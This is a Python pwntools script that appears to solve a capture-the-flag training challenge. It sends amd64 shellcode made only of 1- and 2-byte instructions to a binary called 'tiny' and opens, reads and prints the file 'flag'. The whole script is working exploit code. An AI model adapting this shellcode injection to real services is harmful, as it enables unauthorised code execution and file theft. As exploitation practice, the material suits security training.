from pwn import *

COMMANDS = """
b *0x0000000000401b9e
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./tiny", gdbscript=COMMANDS)
    else:
        c = process("./tiny")

c.recvuntil(b"Can you pop a shell with a shellcode made of 1 or 2 bytes instructions?\n > ")

shellcode = """
//
xor eax,eax
push rax
//
mov bl, 16
mov al, 0x67
mul ebx
mul ebx
mov al, 0x61
mul ebx
mul ebx
mov al, 0x6c
mul ebx
mul ebx
mov al, 0x66
push rax
xor eax,eax
push rsp
// ----open----
pop rdi
xor esi, esi
xor edx, edx
mov al, 2
syscall
// ----read----
mov edi, eax
xor eax, eax
push rsp
pop rsi
mov dl, 70
syscall
// ---write----
xor eax, eax
mov al, 0x01
xor edi, edi
inc edi
push rsp
pop rsi
mov dl, 70
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c)
c.interactive()
